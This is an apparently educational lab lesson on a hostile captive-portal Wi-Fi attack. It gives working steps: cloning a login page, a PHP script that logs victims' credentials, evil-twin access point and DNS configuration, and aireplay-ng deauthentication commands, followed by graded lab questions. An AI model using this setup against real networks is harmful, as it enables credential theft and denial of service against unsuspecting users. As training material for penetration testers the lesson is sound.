
<h1>Hostile Portal Attacks</h1>
<hr/>
<p>If our goal is to capture a user's username and password for the captive portal, we can employ a hostile portal attack using a rogue AP or evil-twin setup. This approach allows us to prompt users to enter their credentials on our fake captive portal, enabling us to capture and reuse them.</p>
<p>To begin, we launch a rogue access point (evil twin) configured with the same open authentication and BSSID as the target network. We then carry out a deauthentication attack to disconnect clients from the legitimate AP, coercing them to automatically connect to our rogue AP instead.</p>
<p><img alt="Hostile" src="https://academy.hackthebox.com/storage/modules/299/hostile/evil.png"/></p>
<p>Once connected, we host a fake captive portal that mimics the target AP’s login page, tricking users into entering their credentials, which we then capture.</p>
<p><img alt="Hostile" src="https://academy.hackthebox.com/storage/modules/299/hostile/captive.png"/></p>
<hr/>
<h4>General steps for Hostile Portal Attack:</h4>
<ol>
<li>Installing and Configuring Apache2 and PHP</li>
<li>Creating our Captive Portal</li>
<li>Configure the Routing</li>
<li>Setting up our Access Point</li>
<li>Denying Service</li>
<li>Harvest and Validate Credentials</li>
</ol>
<hr/>
<h3>1. Installing and Configuring Apache2 and PHP</h3>
<div class="alert alert-primary fade show" role="alert">
<i class="mdi mdi-information-outline mr-2"></i> <b>Apache2</b> and <b>PHP</b> are pre-installed within the lab environment, allowing us to focus directly on executing the attack. The following setup steps are provided solely for demonstration purposes.
</div>
<p>One of the easiest ways to impersonate a legitimate captive portal is by setting up our own. To make it as convincing as possible, we will install, configure, and set up Apache2 and PHP to host a cloned version of the target captive portal.</p>
<p>First, we need to install and configure Apache2, PHP, and enable the Apache2 rewrite engine.</p>
<pre><code class="language-shell-session">[!bash!]$ sudo apt-get install apache2 php libapache2-mod-php
</code></pre>
<p>To enable the Apache re-write engine, we run following command.</p>
<pre><code class="language-shell-session">[!bash!]$ sudo a2enmod rewrite
</code></pre>
<p>Next, we need to allow overrides in the <code>/</code> and <code>/var/www</code> directories. To do this, we edit the <code>/etc/apache2/apache2.conf</code> file as shown below.</p>
<pre><code class="language-config">&lt;Directory /&gt;
	Options FollowSymLinks
	AllowOverride All
	Require all denied
&lt;/Directory&gt;
&lt;Directory /var/www/&gt;
	Options Indexes FollowSymLinks
	AllowOverride All
	Require all granted
&lt;/Directory&gt;
</code></pre>
<p>Now, we need to set up an <code>.htaccess</code> file inside <code>/var/www/html/</code> as usual. This file is responsible for prompting users to sign in to our network.</p>
<pre><code class="language-conf">RewriteEngine on
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME} !-f
RewriteRule . index.html [L]
</code></pre>
<p>Finally, we should restart the Apache service to apply the changes.</p>
<pre><code class="language-shell-session">[!bash!]$ sudo service apache2 restart
</code></pre>
<hr/>
<h3>2. Creating our Captive Portal</h3>
<p>To appear legitimate, we should clone the target network's captive portal. We can easily accomplish this using <a href="https://www.httrack.com/">HTTrack</a>. After reconnecting to the target network, we can run the following command to start cloning the target captive portal.</p>
<pre><code class="language-shell-session">[!bash!]$ httrack http://captive.htb.local
</code></pre>
<p>If everything goes as planned, we should have at least a static copy of the target portal in the folder named <code>captive.htb.local</code>. As with any portal, even beyond our example, we will need to modify the files to make our captive portal functional.</p>
<p>For example, if we want to understand how this portal operates organically, we can use the cat command or open the <code>index.html</code> file in our preferred text editor. The key focus is identifying the <code>form elements</code> and the specific values passed in the HTTP request from the client to the server.</p>
<pre><code class="language-html">&lt;form action="received.php" method="POST" class="centered-form"&gt;
	    &lt;img src="logo-htb.svg"&gt;&lt;/img&gt;
  		&lt;div class="content-title spacing"&gt;Welcome to HTB-Guest, please sign in using your Domain Credentials&lt;/div&gt;
  		&lt;div class="input spacing"&gt;
        	&lt;input class="inputbox2" name="username" type="text" placeholder="Username" required /&gt;
    	&lt;/div&gt;
    	&lt;div class="input spacing"&gt;
        	&lt;input class="inputbox2" name="password" type="password" placeholder="Password" required /&gt;
    	&lt;/div&gt;
    	&lt;div class="input spacing"&gt;
    		&lt;input class="submit-button" type="submit" name="submit" value="Sign In"&gt;
    	&lt;/div&gt;
 &lt;/form&gt;
</code></pre>
<p>Next, we need to modify the index.html file to update the form's action attribute.</p>
<p>We replace:</p>
<pre><code class="language-html">&lt;form action="http://captive.htb.local/received.php" method="POST" class="centered-form"&gt;
</code></pre>
<p>With:</p>
<pre><code class="language-html">&lt;form action="/received.php" method="POST" class="centered-form"&gt;
</code></pre>
<p>This change ensures that the form submission is directed to received.php of the local server rather than an absolute URL.</p>
<p>If we notice a watermark like the following at the end of <code>index.html</code>, we should remove it to make the cloned page look more legitimate.:</p>
<pre><code class="language-html">&lt;!-- Mirrored from captive.htb.local/ by HTTrack Website Copier/3.x [XR&amp;CO'2014], Sun, 16 Mar 2025 19:01:49 GMT --&gt;
</code></pre>
<p>Subsequently, we create a PHP script named <code>received.php</code> to capture the submitted username and password.</p>
<pre><code class="language-php">&lt;?php
if(isset($_POST['submit'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $data = $username . ' ' . $password . "\r\n";
    $ret = file_put_contents('passes.lst', $data, FILE_APPEND | LOCK_EX);
    if($ret === false) {
        die('An error has occurred');
    }
    else {
        echo "Thank you for signing in. You will be redirected shortly!";
    }
}
else {
   die('No post data to process');
}
?&gt;
</code></pre>
<p>Following the creation of this file, we should also create the corresponding <code>passes.lst</code>. We can do this using our preferred text editor or the echo command.</p>
<pre><code class="language-shell-session">[!bash!]$ sudo sh -c 'echo "" &gt;&gt; /var/www/html/passes.lst'
</code></pre>
<p>Once we have finalized all our files, we copy them to <code>/var/www/html</code> to be hosted by Apache2.</p>
<pre><code class="language-shell-session">[!bash!]$ sudo cp * /var/www/html
</code></pre>
<p>Finally, we run the following command to set the correct ownership permissions:</p>
<pre><code class="language-shell-session">[!bash!]$ sudo chown -R www-data:www-data /var/www/html/*
</code></pre>
<p>Afterwards, we can visit <code>localhost</code> in a browser to verify that everything is working correctly.</p>
<p><img alt="Hostile" src="https://academy.hackthebox.com/storage/modules/299/hostile/001.PNG"/></p>
<p>Optionally, if we want to prompt Android users to sign in to our rogue network, we need to ensure that Captive Portal detection functionality is included. If it is not already present in our cloned captive portal, we must add the necessary Captive Portal detection API settings to both our index.html file and our dnsmasq configuration.</p>
<pre><code class="language-html">&lt;head&gt;
  &lt;title&gt; HTB-Guest Login &lt;/title&gt;
  &lt;link rel="stylesheet" href="index.css"&gt;
  
        &lt;script type="text/javascript"&gt;
        function startCaptivePortalDetection() {
        var image = new Image();
                image.onerror = function () {
                window.location.href = "http://192.168.0.1";
            };
                image.src = "http://clients3.google.com/generate_204";
        }
        setTimeout(startCaptivePortalDetection, 60000);
        &lt;/script&gt;
&lt;/head&gt;
</code></pre>
<p>Most modern Android devices attempt to connect to <code>connectivitycheck.gstatic.com/generate_204</code> when joining a public wireless network. If this check fails, they look for a specific JavaScript snippet to detect a captive portal, prompting users to sign in.</p>
<hr/>
<h3>3. Configure the Routing</h3>
<p>The next step is to configure routing by setting up the DNS and DHCP servers for the fake access point. These services will assign IP addresses to connected clients and handle their network requests, ensuring seamless connectivity that mimics the legitimate access point.</p>
<p>To configure the routing correctly, we need to follow these steps:</p>
<ul>
<li>
<code>Set up DNS and DHCP for the fake network</code> : Configure DNS and DHCP services for the rogue access point, ensuring clients receive valid IP addresses and can resolve domain names.</li>
<li>
<code>Assign a valid IP address to the wireless interface</code> : Configure the wireless interface hosting the fake access point (e.g., wlan1) with a proper IP address to ensure proper routing.</li>
</ul>
<p>We can use dnsmasq to configure DNS and DHCP for the wlan1 interface. To get started, we need to create a dns.conf file with the following contents:</p>
<pre><code class="language-config">interface=wlan1
dhcp-range=192.168.0.2,192.168.0.254,255.255.255.0,10h
dhcp-option=3,192.168.0.1
dhcp-option=6,192.168.0.1
server=8.8.4.4
server=8.8.8.8
listen-address=127.0.0.1
address=/#/192.168.0.1
log-dhcp
log-queries
</code></pre>
<p>In the above config file, we specify many parameters. These parameters can be broken down like the following:</p>
<table>
<thead>
<tr>
<th>Item</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Interface</code></td>
<td>The interface which we will be hosting the access point on.</td>
</tr>
<tr>
<td><code>dhcp-range</code></td>
<td>This specifies that the DHCP server will provide IP addresses to connected clients starting from 192.168.0.2 up to 192.168.0.254, and each client will receive a lease for 10 hours. Once the lease time expires, the client will need to request a new IP address.</td>
</tr>
<tr>
<td><code>DHCP option 3</code></td>
<td>This option specifies the default gateway for the DHCP clients. In this case, dhcp-option=3,192.168.0.1 tells the clients to use 192.168.0.1 as their gateway, which will be the IP address of the fake access point (wlan1).</td>
</tr>
<tr>
<td><code>DHCP option 6</code></td>
<td>This option specifies the DNS server that the DHCP clients should use. By setting dhcp-option=6,192.168.0.1, the clients are directed to use the IP address of the fake AP (192.168.0.1) as their DNS server, instead of any DNS servers provided by the legitimate gateway or the target network. This ensures that DNS queries are handled by the attacker's fake AP, which can be used to intercept, manipulate, or redirect DNS requests.</td>
</tr>
<tr>
<td><code>server</code></td>
<td>This line tells dnsmasq to forward any DNS queries from the connected clients to the public DNS server at 8.8.4.4 &amp; 8.8.8.8.</td>
</tr>
<tr>
<td><code>listen-address</code></td>
<td>The listen-address option in the dnsmasq configuration file specifies the IP address on which dnsmasq will listen for incoming DNS requests.</td>
</tr>
<tr>
<td><code>address</code></td>
<td>This line would make dnsmasq return the IP address 192.168.0.1 when clients try to resolve any domain. The # symbol is a wildcard that matches any domain.</td>
</tr>
<tr>
<td><code>log-dhcp</code></td>
<td>The log-dhcp option in dnsmasq enables logging of DHCP (Dynamic Host Configuration Protocol) activity. When this option is activated, dnsmasq will log each DHCP event, such as IP address assignments, leases, and client interactions with the DHCP server.</td>
</tr>
<tr>
<td><code>log-queries</code></td>
<td>The log-queries option in dnsmasq enables logging of all DNS queries made by clients. When this option is activated, dnsmasq will log each DNS request it receives, along with details such as the queried domain, the source IP address of the client, and the response sent back.</td>
</tr>
</tbody>
</table>
<p>To start the DNS server with our configuration, we first stop any running dnsmasq service to avoid conflicts by using the command shown below:</p>
<pre><code class="language-shell-session">[!bash!]$ service dnsmasq stop
</code></pre>
<p>Next, we execute the DNS configuration file and start the DNS server on port 53 using <code>dnsmasq</code>:</p>
<pre><code class="language-shell-session">[!bash!]$ sudo dnsmasq -C dns.conf -d

dnsmasq: started, version 2.90 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset no-nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
dnsmasq-dhcp: DHCP, IP range 192.168.0.2 -- 192.168.0.254, lease time 10h
dnsmasq: using nameserver 8.8.4.4#53
dnsmasq: using nameserver 8.8.8.8#53
dnsmasq: reading /etc/resolv.conf
dnsmasq: using nameserver 8.8.4.4#53
dnsmasq: using nameserver 8.8.8.8#53
dnsmasq: using nameserver 127.0.0.53#53
dnsmasq: read /etc/hosts - 7 names
</code></pre>
<p>Then, we need to configure the valid IP address for the interface that will host the fake access point (<code>wlan1</code>).</p>
<pre><code class="language-shell-session">[!bash!]$ sudo ifconfig wlan1 192.168.0.1/24
[!bash!]$ ifconfig wlan1

wlan1: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500
        inet 192.168.0.1  netmask 255.255.255.0  broadcast 192.168.0.255
        ether 02:00:00:00:03:00  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</code></pre>
<p>Additionally, we must ensure that IP forwarding is enabled on the machine to allow proper routing of traffic between the fake access point and the internet. We can do this by running:</p>
<pre><code class="language-shell-session">[!bash!]$ sudo sh -c 'echo 1 &gt; /proc/sys/net/ipv4/ip_forward'
</code></pre>
<hr/>
<h3>4. Setting up our Access Point</h3>
<p>To set up our rogue access point, we use the following configuration file and save it as hostapd.conf:</p>
<pre><code class="language-conf">interface=wlan1
driver=nl80211
ssid=HTB-Guest
hw_mode=g
channel=1
auth_algs=1
bssid=6A:48:AC:B4:EF:05
</code></pre>
<p>When the configuration file is ready, we launch the rogue access point using hostapd:</p>
<pre><code class="language-shell-session">[!bash!]$ hostapd hostapd.conf 

rfkill: Cannot open RFKILL control device
wlan0: interface state UNINITIALIZED-&gt;ENABLED
wlan0: AP-ENABLED 
</code></pre>
<hr/>
<h3>5. Denying Service</h3>
<p>Initially, we can wait for clients to connect to our rogue access point (AP) naturally. However, if no connections occur after a reasonable amount of time, we can forcefully encourage clients to connect by performing a deauthentication attack against the legitimate AP. This attack disconnects clients from the legitimate network, making them more likely to connect to our rogue AP.</p>
<p>Our first task is to enable monitor mode on the wlan0 interface using airmon-ng. This will put wlan0 into monitor mode, typically renaming it to wlan0mon.</p>
<pre><code class="language-shell-session">[!bash!]$ airmon-ng start wlan0

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    178 avahi-daemon
    194 wpa_supplicant
    198 avahi-daemon
    205 NetworkManager

PHY	Interface	Driver		Chipset

phy1	wlan0		mac80211_hwsim	HTB Chipset of 802.11 radio(s) for mac80211
ai		(mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1]wlan0mon)
		(mac80211 station mode vif disabled for [phy1]wlan0)
rphy2	wlan1		mac80211_hwsim	HTB Chipset of 802.11 radio(s) for mac80211
</code></pre>
<p>Once the interface is in monitor mode, we use airodump-ng to scan for nearby access points and identify our target AP's BSSID:</p>
<pre><code class="language-shell-session">[!bash!]$ airodump-ng wlan0mon -c 1

 CH  1 ][ Elapsed: 12 s ][ 2025-03-16 19:07 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
 
 6A:48:AC:B4:EF:05  -28 100      127        0    0   1   54   OPN              HTB-Guest
 D4:C1:8B:79:AD:45  -28   0      127       54    1   1   54   OPN              HTB-Guest                                

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 D4:C1:8B:79:AD:45  91:29:2c:20:e7:10  -29   54 - 9      0       12
 D4:C1:8B:79:AD:45  74:b9:59:2e:e6:66  -29    1 -11      0       12
 D4:C1:8B:79:AD:45  9f:03:1f:4f:95:73  -29    1 - 5      0       13 
</code></pre>
<p>From the output, we can confirm that all clients are connected to the legitimate access point (AP) with the BSSID D4:C1:8B:79:AD:45. To execute a deauthentication attack, we can use aireplay-ng:</p>
<pre><code class="language-shell-session">[!bash!]$ aireplay-ng --deauth 5 -a D4:C1:8B:79:AD:45 wlan0mon

19:17:02  Sending DeAuth (code 7) to broadcast -- BSSID: [D4:C1:8B:79:AD:45]
19:17:02  Sending DeAuth (code 7) to broadcast -- BSSID: [D4:C1:8B:79:AD:45]
19:17:03  Sending DeAuth (code 7) to broadcast -- BSSID: [D4:C1:8B:79:AD:45]
</code></pre>
<hr/>
<h3>6. Harvest and Validate Credentials</h3>
<p>After a client successfully connects to our rogue AP, they will be redirected to our hostile captive portal, which would look like following:</p>
<p>If the client enters their password, the credentials will be captured and saved in the <code>passes.lst</code> file.</p>
<pre><code class="language-shell-session">[!bash!]$ cat /var/www/html/passes.lst 

&lt;SNIP&gt;
</code></pre>
<p>We can use the obtained credentials to log in to the captive portal of the target Wi-Fi network.</p>
<div class="alert alert-primary fade show" role="alert">
<i class="mdi mdi-information-outline mr-2"></i> <b> Note:</b> In the lab environment, after connecting to the <b>HTB-Guest</b> Wi-Fi network and signing into the captive portal, you will be redirected to <b>index.html</b> page. You will need to wait for <b>1-2 minutes</b> before performing a hard refresh <b>(Ctrl+Shift+R)</b> to successfully log in. Due to firewall configurations, there is a delay in authenticating the user based on their IP address.
</div>
<div class="my-3 p-3 vpn-switch-card" id="vpn-switch">
<p class="font-size-14 color-white mb-0">VPN Servers</p>
<p class="font-size-13 mb-0">
<i class="fas fa-exclamation-triangle text-warning"></i><span class="color-white ml-1">Warning:</span> Each
                    time you "Switch",
                    your connection keys are regenerated and you must re-download your VPN connection file.
                </p>
<p class="font-size-13 mb-0">
                    All VM instances associated with the old VPN Server will be terminated when switching to
                    a new VPN server. <br/>
                    Existing PwnBox instances will automatically switch to the new VPN server.</p>
<div class="row mb-3">
<div class="col-12 mt-2">
<div class="d-none justify-content-center vpn-loader">
<div class="spinner-border text-success" role="status">
<span class="sr-only">Switching VPN...</span>
</div>
</div>
<select aria-label="vpn server" class="selectpicker custom-form-control vpnSelector badge-select" title="Select VPN Server">
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 6 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt; &lt;span class='recommended'&gt; &lt;img src='/images/sparkles-solid.svg'/&gt;Recommended&lt;/span&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="30" value="17">US Academy 6</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 5 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="31" value="16">US Academy 5</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 2 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="32" value="5">US Academy 2</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 4 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="32" value="13">US Academy 4</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 1 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="34" value="4">US Academy 1</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 3 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="37" value="9">US Academy 3</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 5 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt; &lt;span class='recommended'&gt; &lt;img src='/images/sparkles-solid.svg'/&gt;Recommended&lt;/span&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="37" value="12">EU Academy 5</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 2 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="40" selected="" value="2">EU Academy 2</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 1 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="42" value="1">EU Academy 1</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 3 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="42" value="14">EU Academy 3</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 4 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="43" value="11">EU Academy 4</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 6 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="48" value="15">EU Academy 6</option>
</select>
<p class="font-size-14 color-white mb-0 mt-2">PROTOCOL</p>
<div class="d-flex">
<div class="custom-control custom-radio custom-control-inline">
<input checked="" class="custom-control-input" id="rd_1" name="vpn-protocol" type="radio" value="udp"/>
<label class="custom-control-label green font-size-14" for="rd_1">UDP
                                    1337</label>
</div>
<div class="custom-control custom-radio">
<input class="custom-control-input" id="rd_2" name="vpn-protocol" type="radio" value="tcp"/>
<label class="custom-control-label green font-size-14" for="rd_2">TCP
                                    443</label>
</div>
</div>
<div class="d-flex justify-content-center">
<button class="btn btn-outline-success btn-lg download-vpn-settings mt-3 px-5 font-size-12">
                                DOWNLOAD VPN CONNECTION FILE
                            </button>
</div>
</div>
</div>
</div>
<div class="mb-5 pwnbox-select-card"></div>
<div id="screen" style="height: 600px; border: 1px solid;">
<div class="screenPlaceholder">
<div class="instanceLoading" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Instance is starting...</div>
</div>
<div class="instanceTerminating" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Terminating instance...</div>
</div>
<div class="row instanceStart max-width-canvas">
<div class="col-4"></div>
<div class="col-4">
<button class="startInstanceBtn btn btn-success text-light btn-lg btn-block" style="margin-top: 270px;">Start Instance
                            </button>
<p class="text-center mt-2 font-size-13 font-secondary">
<span class="text-success spawnsLeft">
<i class="fal fa-infinity"></i>
</span> / 1 spawns left
                            </p>
</div>
<div class="col-4"></div>
</div>
</div>
</div>
<div class="row align-center justify-center my-4">
<div class="col-5 justify-start">
<button class="instance-button fullScreenBtn btn btn-light btn-sm float-left" style="display:none;" target="_blank"><i class="fad fa-expand text-success mr-1"></i>  Full Screen
                    </button>
<button class="instance-button terminateInstanceBtn btn btn-light btn-sm ml-2" style="display:none;"><i class="fad fa-times text-danger"></i>  Terminate
                    </button>
<button class="instance-button resetInstanceBtn btn btn-light btn-sm ml-1" style="display:none;"><i class="fad fa-sync text-warning mr-2"></i>  Reset
                    </button>
<div class="btn-group" role="group">
<button class="instance-button extendInstanceBtn btn btn-light btn-sm ml-1" style="display:none;cursor: default;">Life Left:
                            <span class="lifeLeft"></span>m
                        </button>
<button class="extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm" data-title="Extend Life" data-toggle="tooltip" style="display:none;"><i class="fa fa-plus text-success"></i></button>
</div>
</div>
<div class="col-7 justify-end pt-2 pr-2 font-size-small text-right" id="statusText">Waiting to
                    start...
                </div>
</div>
<div class="d-inline-block mb-2 solutionSettings solutionSettingsOffsets" id="solutionsModuleSetting">
<div class="border border-secondary p-2 rounded">
<div class="custom-control custom-switch d-flex">
<input class="custom-control-input" disabled="" id="showSolutionsModuleSetting" type="checkbox"/>
<label class="custom-control-label font-size-14 font-weight-normal text-white" for="showSolutionsModuleSetting">
                                Enable step-by-step solutions for all questions
                            </label>
<span aria-hidden="true" class="cursor-pointer font-size-14 ml-1 mr-1 text-white" data-content="Access to this feature is exclusive to annual subscribers. To acquire an annual subscription, kindly proceed by clicking &lt;a href='/billing'&gt;here&lt;/a&gt;." data-html="true" data-placement="top" data-toggle="popover" data-trigger="click" title="Activate Solutions">
<i class="fa fa-info-circle font-size-12"></i>
</span>
<img alt="sparkles-icon-decoration" class="ml-2 w-auto sparkles-icon" height="20" src="/images/sparkles-solid.svg">
</img></div>
</div>
</div>
<div class="card" id="questionsDiv">
<div class="card-body">
<div class="row">
<div class="col-9">
<h4 class="card-title mt-0 font-size-medium">Questions</h4>
<p class="card-title-desc font-size-large font-size-15">Answer the question(s) below
                                to complete this Section and earn cubes!</p>
<span class="spawnTargetBtn spawn-target-text-clone d-none">Click here to spawn the target
                                system!</span>
<p class="card-title-desc font-size-large font-size-15 mb-0">
    Target(s): <span class="text-success">
<span class="target" style="cursor:pointer;">
<i class="fad fa-circle-notch fa-spin"></i>
<span class="spawnTargetBtn">Fetching status...</span>
</span>
</span>
<button class="resetTargetBtn btn btn-light btn-sm" data-title="Reset Target(s)" data-toggle="tooltip" style="cursor: pointer; display: none;">
<i class="fad fa-sync text-warning"></i>
</button>
<br/>
<div class="d-flex align-items-center targetLifeContainer">
<span class="targetLifeTimeContainer" style="display: none;">
            Life Left: <span class="targetLifeTime font-size-15">0</span> minute(s)
                            <button class="extendTargetSystemBtn btn btn-light btn-sm module-button" data-title="Extend Life by 1 hour (up to 6 hours total lifespan)" data-toggle="tooltip">
<i class="fa fa-plus text-success extend-icon"></i>
<div class="extend-loader spinner-border spinner-border-small text-success d-none" role="status">
</div>
</button>
<button class="text-danger btn btn-light btn-sm module-button font-size-16 mb-1" data-target="#terminateVmModal" data-toggle="modal">
                    Terminate <span class="fa-regular fa-x text-danger font-size-13 ml-2"></span>
</button>
</span>
</div>
</p>
</div>
<div class="col-3 text-right float-right">
<button class="btn btn-light bg-color-blue-nav mt-2 w-100 d-flex align-items-center" data-target="#cheatSheetModal" data-toggle="modal">
<div><i class="fad fa-file-alt mr-2"></i></div>
<div class="text-center w-100 ml-1">Cheat Sheet</div>
</button>
<a class="btn btn-light bg-color-blue-nav mt-2 d-flex align-items-center" data-title='Key is already installed in "My Workstation"' data-toggle="tooltip" href="https://academy.hackthebox.com/vpn/key">
<div><i class="fad fa-chart-network mr-2"></i></div>
<div class="text-center w-100">Download VPN Connection File</div>
</a>
</div>
</div>
<div>
<div>
<p class="mb-0 font-size-12"><i class="fad fa-chart-network text-success mr-2 font-size-medium"></i>
                                RDP
                                to <span class="target-protocol-ip target-protocol-ip-2976 text-dark"></span> with user "<span class="text-success">wifi</span>" and
                                password "<span class="text-danger">wifi</span>" </p>
<label class="module-question" for="2976"><span class="badge badge-soft-dark font-size-14 mr-2">+ 3 <i class="fad fa-cube text-success"></i></span> Perform the hostile portal attack as demonstrated in the section. What is the password for the user admin?
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer2976" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-2976">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="2976" id="btnAnswer2976">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
</div>
</div>
<div class="custom-hr">
</div>
</div>
<div>
<p class="mb-0 font-size-12"><i class="fad fa-chart-network text-success mr-2 font-size-medium"></i>
                                RDP
                                to <span class="target-protocol-ip target-protocol-ip-2977 text-dark"></span> with user "<span class="text-success">wifi</span>" and
                                password "<span class="text-danger">wifi</span>" </p>
<label class="module-question" for="2977"><span class="badge badge-soft-dark font-size-14 mr-2">+ 3 <i class="fad fa-cube text-success"></i></span> Connect to the portal using the obtained credentials. What is the flag displayed after successful login?
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer2977" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-2977">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="2977" id="btnAnswer2977">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
</div>
</div>
<div class="">
</div>
</div>
</div>
</div>
</div>
